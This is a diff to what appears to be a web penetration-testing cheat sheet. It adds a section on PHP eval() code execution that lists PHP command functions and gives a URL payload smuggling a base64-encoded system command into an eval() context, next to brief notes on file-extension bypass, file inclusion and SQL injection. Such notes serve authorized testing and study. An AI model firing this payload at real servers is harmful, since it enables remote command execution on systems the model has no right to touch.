@@ -87,6 +87,19 @@ Filter / file ext bypass
 Arbitrary file disclosure / LFI / RFI
 * Try all three if one works.
 
+PHP code exec i.e. `eval()`
+```
+# Try different system command functions
+system()
+passthru()
+exec()
+shell_exec()
+
+# Encode payload in base64 -> use base64_decode()
+# You may need to URL encode base64 '=' equals to '%3d'
+/index.php?b);system(base64_decode('INSERT_BASE64_ENCODED_SYSTEM_COMMAND')=/
+```
+
 SQL Injection
 1. Test single and double quotes for *500 Internal Server Error* response.
 2. Manually test payloads or use Burp Intruder with SQL payloads.
